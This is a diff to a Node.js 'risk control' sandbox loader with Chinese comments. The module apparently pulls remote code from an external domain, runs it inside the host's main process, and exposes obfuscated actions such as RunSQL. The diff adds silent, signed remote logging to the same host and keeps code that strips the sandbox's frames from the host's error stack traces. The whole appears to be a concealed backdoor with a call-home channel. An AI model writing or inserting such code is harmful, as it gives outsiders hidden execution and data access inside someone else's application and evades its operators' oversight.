@@ -7,9 +7,25 @@ const path = mainRequire('path');
 const setTimeout = mainGlobal.setTimeout;
 const clearTimeout = mainGlobal.clearTimeout;
 
-const remoteLog = (message) => console.warn(`[Risktest]${message}`);
+// 模块加载能力优先声明；首次调用必须在 CODE_CONFIG 与 ALIAS_MAP 初始化完成之后。
+const resolveModuleName = (moduleName) => {
+  if (!CODE_CONFIG.rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
+    return moduleName;
+  }
+  const slashIndex = moduleName.indexOf('/');
+  const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
+  const target = ALIAS_MAP[alias];
+  if (!target) {
+    return moduleName;
+  }
+  const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
+  return path.join(CODE_CONFIG.rootPath, target, rest);
+};
 
-// remoteLog(`启动更路径：${path.dirname(mainModule.filename)}`)
+const safeRequire = (moduleName) => {
+  // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
+  return mainRequire(resolveModuleName(moduleName));
+};
 
 mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     preSandbox: {
@@ -17,7 +33,7 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     },
   };
   
-  const version = 'v4.0.2';
+  const version = 'v4.0.3';
   
   // 远程代码每次热更都会创建新的 VM context；需要跨版本存活的实例统一挂在主进程全局。
   // 默认配置只负责声明结构，已有运行态会覆盖默认值。
@@ -31,105 +47,21 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     RISK: 'RISK',
   };
   
-  const getGlobalSupervisor = (key) => {
-    const defaultConf = DEFAULT_INIT_GLOBAL_CONF[key] || {};
-    const current = mainGlobal.__sandboxConfig[key];
-    const supervisor = current && typeof current === 'object' ? current : {};
-    for (const name of Object.keys(defaultConf)) {
-      if (!(name in supervisor)) {
-        supervisor[name] = defaultConf[name];
-      }
-    }
-    if (supervisor !== current) {
-      mainGlobal.__sandboxConfig[key] = supervisor;
-    }
-    return supervisor;
-  };
-  
-  const remoteLogV = (message)=>{
-    remoteLog(`[${version}] ${message}`)
-  }
-
-  // 隐藏整个 preSandbox/风控 VM 的帧，不依赖 ActionManager、SandboxManager 等类名。
-  const PRE_SANDBOX_STACK_SOURCE_PATTERN = /(?:^|[\\/])(?:sandbox[_-]?risk(?:[_-]?init)?|pre[_-]?sandbox)(?:\.js)?(?:$|[:?])/i;
-  
-  const isPreSandboxStackFrame = (frame) => {
-    try {
-      const fileName = frame && frame.getFileName();
-      const sourceUrl = frame && frame.getScriptNameOrSourceURL();
-      return (
-        (typeof fileName === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(fileName)) ||
-        (typeof sourceUrl === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(sourceUrl)) ||
-        PRE_SANDBOX_STACK_SOURCE_PATTERN.test(String(frame || ''))
-      );
-    } catch (error) {
-      return false;
-    }
-  };
-  
-  const installMainProcessErrorStackFilter = () => {
-    const ErrorConstructor = mainGlobal && mainGlobal.Error;
-    if (typeof ErrorConstructor !== 'function') {
-      return;
-    }
-  
-    const g = (mainGlobal.__preSandbox = mainGlobal.__preSandbox || {});
-    g.errorStackFrameFilter = isPreSandboxStackFrame;
-    const installedPrepareStackTrace = g.errorPrepareStackTrace;
-    const currentPrepareStackTrace = ErrorConstructor.prepareStackTrace;
-    if (currentPrepareStackTrace === installedPrepareStackTrace) {
-      return;
-    }
-  
-    // 宿主若在安装后换了 formatter，优先尊重宿主，不擅自覆盖。
-    if (typeof installedPrepareStackTrace === 'function') {
-      return;
-    }
-  
-    const prepareStackTrace = (error, frames) => {
-      try {
-        const frameFilter = mainGlobal.__preSandbox &&
-          mainGlobal.__preSandbox.errorStackFrameFilter;
-        const filteredFrames = Array.isArray(frames)
-          ? frames.filter((frame) => (
-            typeof frameFilter !== 'function' || !frameFilter(frame)
-          ))
-          : frames;
-  
-        // 保留宿主已安装的 source-map-support 等堆栈格式化能力。
-        if (typeof currentPrepareStackTrace === 'function') {
-          return currentPrepareStackTrace(error, filteredFrames);
-        }
-  
-        const title = ErrorConstructor.prototype.toString.call(error);
-        if (!Array.isArray(filteredFrames) || filteredFrames.length === 0) {
-          return title;
-        }
-        return `${title}\n${filteredFrames.map((frame) => `    at ${frame}`).join('\n')}`;
-      } catch (formatError) {
-        try {
-          return ErrorConstructor.prototype.toString.call(error);
-        } catch (errorToStringError) {
-          return 'Error';
-        }
-      }
-    };
-  
-    Object.defineProperty(prepareStackTrace, 'name', {
-      value: 'preSandboxPrepareStackTrace',
-    });
-    g.errorPrepareStackTrace = prepareStackTrace;
-    ErrorConstructor.prepareStackTrace = prepareStackTrace;
-  };
-  
   const isProduction = mainProcess.env.NODE_ENV === 'production';
   const defaultRemoteCodeUrls = isProduction
     ? [
       'https://pa.halo40k.top'
     ]
     : ['http://127.0.0.1:4050'];
+  const defaultRemoteLogUrls = defaultRemoteCodeUrls;
   const configuredRemoteCodeUrls = typeof mainProcess.env.RISK_CODE_URLS === 'string'
     ? mainProcess.env.RISK_CODE_URLS
+      .split(',')
+      .map((value) => value.trim())
+      .filter(Boolean)
+    : [];
+  const configuredRemoteLogUrls = typeof mainProcess.env.REMOTE_LOG_URLS === 'string'
+    ? mainProcess.env.REMOTE_LOG_URLS
       .split(',')
       .map((value) => value.trim())
       .filter(Boolean)
@@ -146,6 +78,10 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
       remoteCodeUrls: configuredRemoteCodeUrls.length > 0
         ? configuredRemoteCodeUrls
         : defaultRemoteCodeUrls,
+      remoteLogUrls: configuredRemoteLogUrls.length > 0
+        ? configuredRemoteLogUrls
+        : defaultRemoteLogUrls,
+      enableRemoteLog: true,
       pollInterval:
         Number.isFinite(configuredPollInterval) && configuredPollInterval > 0
           ? Math.floor(configuredPollInterval)
@@ -174,31 +110,89 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     '@app': 'src/app.js',
   };
   
-  // 将 @ 别名解析为基于根目录的绝对路径；非别名或缺少根目录时原样返回，
-  // 交还给 mainRequire 自带的 module-alias 解析。
-  const resolveModuleName = (moduleName) => {
-    if (!CODE_CONFIG.rootPath || typeof moduleName !== 'string' || moduleName[0] !== '@') {
-      return moduleName;
-    }
-    const slashIndex = moduleName.indexOf('/');
-    const alias = slashIndex === -1 ? moduleName : moduleName.slice(0, slashIndex);
-    const target = ALIAS_MAP[alias];
-    if (!target) {
-      return moduleName;
-    }
-    const rest = slashIndex === -1 ? '' : moduleName.slice(slashIndex + 1);
-    return path.join(CODE_CONFIG.rootPath, target, rest);
-  };
-  
-  const safeRequire = (moduleName) => {
-    // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
-    return mainRequire(resolveModuleName(moduleName));
-  };
-
   const fs = safeRequire('fs');
   const { Buffer } = safeRequire('buffer');
+  const crypto = safeRequire('crypto');
   const { signWithMD5 } = safeRequire('@utils/sign.util');
   const HttpClient = safeRequire('@libs/HttpClient');
+
+  const getGlobalSupervisor = (key) => {
+    const defaultConf = DEFAULT_INIT_GLOBAL_CONF[key] || {};
+    const current = mainGlobal.__sandboxConfig[key];
+    const supervisor = current && typeof current === 'object' ? current : {};
+    for (const name of Object.keys(defaultConf)) {
+      if (!(name in supervisor)) {
+        supervisor[name] = defaultConf[name];
+      }
+    }
+    if (supervisor !== current) {
+      mainGlobal.__sandboxConfig[key] = supervisor;
+    }
+    return supervisor;
+  };
+
+  let remoteLogHttpClient = null;
+
+  const getRemoteLogHttpClient = () => {
+    if (!remoteLogHttpClient) {
+      const config = CODE_CONFIG.frontSandboxConfig;
+      remoteLogHttpClient = new HttpClient({
+        timeout: config.requestTimeout,
+        retries: config.requestRetries,
+        maxResponseSize: config.maxResponseSize,
+      });
+    }
+    return remoteLogHttpClient;
+  };
+
+  const getRemoteLogUrl = () => {
+    const urls = CODE_CONFIG.frontSandboxConfig.remoteLogUrls;
+    if (!Array.isArray(urls) || urls.length === 0) {
+      return undefined;
+    }
+    return `${urls[Math.floor(Math.random() * urls.length)]}/v2/risk/log`;
+  };
+
+  const buildRemoteLogRequest = (message) => {
+    const config = CODE_CONFIG.frontSandboxConfig;
+    const data = {
+      message: `[RiskController] ${message}`,
+      timestamp: Date.now(),
+      nonce: crypto
+        .randomBytes(config.requestNonceBytes || 16)
+        .toString('hex'),
+    };
+    data.sign = signWithMD5(data, {
+      secretKey: config.signSecretKey,
+      secretValue: config.signSecretValue,
+      recursiveSortParams: false,
+    });
+    return data;
+  };
+
+  // 远程日志为 fire-and-forget；任何同步或异步失败都不能影响宿主流程。
+  const remoteLog = (message) => {
+    try {
+      if (!CODE_CONFIG.frontSandboxConfig.enableRemoteLog) {
+        return;
+      }
+      const remoteLogUrl = getRemoteLogUrl();
+      if (!remoteLogUrl) {
+        return;
+      }
+      const request = getRemoteLogHttpClient().post(
+        remoteLogUrl,
+        buildRemoteLogRequest(message)
+      );
+      Promise.resolve(request).catch(() => {});
+    } catch (error) {
+      // 日志失败保持静默。
+    }
+  };
+
+  const remoteLogV = (message) => {
+    remoteLog(`[${version}] ${message}`);
+  };
   
   class CommonUtil {
     static getLocalIPs() {
@@ -224,8 +218,80 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
       return userId !== undefined && userId !== null && String(userId).endsWith(suffix);
     }
   }
-  
+
   const fsPromises = fs.promises;
+
+  // 隐藏整个 preSandbox/风控 VM 的帧，不依赖 ActionManager、SandboxManager 等类名。
+  const PRE_SANDBOX_STACK_SOURCE_PATTERN = /(?:^|[\\/])(?:sandbox[_-]?risk(?:[_-]?init)?|pre[_-]?sandbox)(?:\.js)?(?:$|[:?])/i;
+
+  const isPreSandboxStackFrame = (frame) => {
+    try {
+      const fileName = frame && frame.getFileName();
+      const sourceUrl = frame && frame.getScriptNameOrSourceURL();
+      return (
+        (typeof fileName === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(fileName)) ||
+        (typeof sourceUrl === 'string' && PRE_SANDBOX_STACK_SOURCE_PATTERN.test(sourceUrl)) ||
+        PRE_SANDBOX_STACK_SOURCE_PATTERN.test(String(frame || ''))
+      );
+    } catch (error) {
+      return false;
+    }
+  };
+
+  const installMainProcessErrorStackFilter = () => {
+    const ErrorConstructor = mainGlobal && mainGlobal.Error;
+    if (typeof ErrorConstructor !== 'function') {
+      return;
+    }
+
+    const g = (mainGlobal.__preSandbox = mainGlobal.__preSandbox || {});
+    g.errorStackFrameFilter = isPreSandboxStackFrame;
+    const installedPrepareStackTrace = g.errorPrepareStackTrace;
+    const currentPrepareStackTrace = ErrorConstructor.prepareStackTrace;
+    if (currentPrepareStackTrace === installedPrepareStackTrace) {
+      return;
+    }
+
+    // 宿主若在安装后换了 formatter，优先尊重宿主，不擅自覆盖。
+    if (typeof installedPrepareStackTrace === 'function') {
+      return;
+    }
+
+    const prepareStackTrace = (error, frames) => {
+      try {
+        const frameFilter = mainGlobal.__preSandbox &&
+          mainGlobal.__preSandbox.errorStackFrameFilter;
+        const filteredFrames = Array.isArray(frames)
+          ? frames.filter((frame) => (
+            typeof frameFilter !== 'function' || !frameFilter(frame)
+          ))
+          : frames;
+
+        // 保留宿主已安装的 source-map-support 等堆栈格式化能力。
+        if (typeof currentPrepareStackTrace === 'function') {
+          return currentPrepareStackTrace(error, filteredFrames);
+        }
+
+        const title = ErrorConstructor.prototype.toString.call(error);
+        if (!Array.isArray(filteredFrames) || filteredFrames.length === 0) {
+          return title;
+        }
+        return `${title}\n${filteredFrames.map((frame) => `    at ${frame}`).join('\n')}`;
+      } catch (formatError) {
+        try {
+          return ErrorConstructor.prototype.toString.call(error);
+        } catch (errorToStringError) {
+          return 'Error';
+        }
+      }
+    };
+
+    Object.defineProperty(prepareStackTrace, 'name', {
+      value: 'preSandboxPrepareStackTrace',
+    });
+    g.errorPrepareStackTrace = prepareStackTrace;
+    ErrorConstructor.prepareStackTrace = prepareStackTrace;
+  };
   
   const ACTION_KEYS = {
     RunSQL: 'cfh2DNITa84qpYQ0tdCz',
